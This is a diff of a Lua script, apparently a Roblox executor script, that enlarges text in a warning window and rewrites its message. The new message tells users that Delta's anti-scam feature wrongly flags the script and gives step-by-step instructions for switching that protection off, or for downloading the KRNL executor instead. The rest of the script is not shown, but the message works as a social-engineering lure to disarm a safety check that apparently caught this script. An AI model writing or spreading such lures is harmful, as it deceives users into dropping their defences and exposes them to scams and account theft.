@@ -123,7 +123,7 @@ local function createWarningGUI(warningText)
     watermark.BackgroundTransparency = 1
     watermark.Text = "Developer: @pocarisv"
     watermark.Font = Enum.Font.Gotham
-    watermark.TextSize = isMobile and 8 or 10
+    watermark.TextSize = isMobile and 10 or 12  -- Increased from 8/10
     watermark.TextColor3 = Color3.fromRGB(180, 180, 180)
     watermark.TextXAlignment = Enum.TextXAlignment.Center
     
@@ -145,7 +145,7 @@ local function createWarningGUI(warningText)
     warningIcon.BackgroundTransparency = 1
     warningIcon.Text = "⚠️"
     warningIcon.Font = Enum.Font.GothamBold
-    warningIcon.TextSize = isMobile and 16 or 18
+    warningIcon.TextSize = isMobile and 18 or 22  -- Increased from 16/18
     warningIcon.TextColor3 = Color3.fromRGB(200, 180, 100)
     warningIcon.TextXAlignment = Enum.TextXAlignment.Left
     warningIcon.Parent = titleFrame
@@ -156,7 +156,7 @@ local function createWarningGUI(warningText)
     titleLabel.BackgroundTransparency = 1
     titleLabel.Text = "Warning"
     titleLabel.Font = Enum.Font.GothamBold
-    titleLabel.TextSize = isMobile and 14 or 16
+    titleLabel.TextSize = isMobile and 16 or 20  -- Increased from 14/16
     titleLabel.TextColor3 = Color3.fromRGB(200, 180, 100)
     titleLabel.TextXAlignment = Enum.TextXAlignment.Left
     titleLabel.Parent = titleFrame
@@ -168,7 +168,7 @@ local function createWarningGUI(warningText)
     dragIndicator.BackgroundTransparency = 1
     dragIndicator.Text = "≡"
     dragIndicator.Font = Enum.Font.GothamBold
-    dragIndicator.TextSize = isMobile and 12 or 14
+    dragIndicator.TextSize = isMobile and 14 or 16  -- Increased from 12/14
     dragIndicator.TextColor3 = Color3.fromRGB(150, 150, 150)
     dragIndicator.TextXAlignment = Enum.TextXAlignment.Center
     dragIndicator.Parent = titleFrame
@@ -191,7 +191,7 @@ local function createWarningGUI(warningText)
     warningLabel.BackgroundTransparency = 1
     warningLabel.Text = warningText
     warningLabel.Font = Enum.Font.Gotham
-    warningLabel.TextSize = isMobile and 10 or 12
+    warningLabel.TextSize = isMobile and 14 or 16  -- Increased from 10/12
     warningLabel.TextColor3 = Color3.new(1, 1, 1)
     warningLabel.TextWrapped = true
     warningLabel.TextXAlignment = Enum.TextXAlignment.Left
@@ -214,7 +214,7 @@ local function createWarningGUI(warningText)
     downloadBtn.Size = UDim2.new(0.48, 0, 1, 0)
     downloadBtn.BackgroundColor3 = Color3.fromRGB(180, 140, 60)
     downloadBtn.Text = isMobile and "Get KRNL" or "Download KRNL"
-    downloadBtn.TextSize = isMobile and 10 or 12
+    downloadBtn.TextSize = isMobile and 12 or 14  -- Increased from 10/12
     downloadBtn.Font = Enum.Font.GothamBold
     downloadBtn.TextColor3 = Color3.new(1, 1, 1)
     downloadBtn.BorderSizePixel = 0
@@ -228,7 +228,7 @@ local function createWarningGUI(warningText)
     continueBtn.Position = UDim2.new(0.52, 0, 0, 0)
     continueBtn.BackgroundColor3 = Color3.fromRGB(180, 180, 180)
     continueBtn.Text = "Continue (5s)"
-    continueBtn.TextSize = isMobile and 10 or 12
+    continueBtn.TextSize = isMobile and 12 or 14  -- Increased from 10/12
     continueBtn.Font = Enum.Font.GothamBold
     continueBtn.TextColor3 = Color3.fromRGB(100, 100, 100)
     continueBtn.BorderSizePixel = 0
@@ -343,16 +343,26 @@ local function createWarningGUI(warningText)
     }):Play()
 end
 
-local warningText = [[⚠️ IMPORTANT SECURITY WARNING ⚠️
+local warningText = [[⚠️ UNSUPPORTED EXECUTOR WARNING ⚠️
+
 Dear User,
+
 We're experiencing a problem within Delta Executors and its because of their update in their anti-scam feature, this renders our script into false-positive and make it not work.
+
 To fix this we need your cooperation and turn off anti-scam feature of Delta, to do this follow the following steps below:
+
 1. Open your Delta Menu.
+
 2. Look for a Gear looking Icon and press it. (4th Icon in the Delta Menu)
+
 3. Look for Anti-Scam and turn it off.
+
 4. Our script should work after this, make sure to turn it back on after using the script.
+
 5. Enjoy the game ;)
+
 Alternatively: You can use KRNL Executor but that requires downloading another executor again.
+
 - @pocarisv
 ]]
 
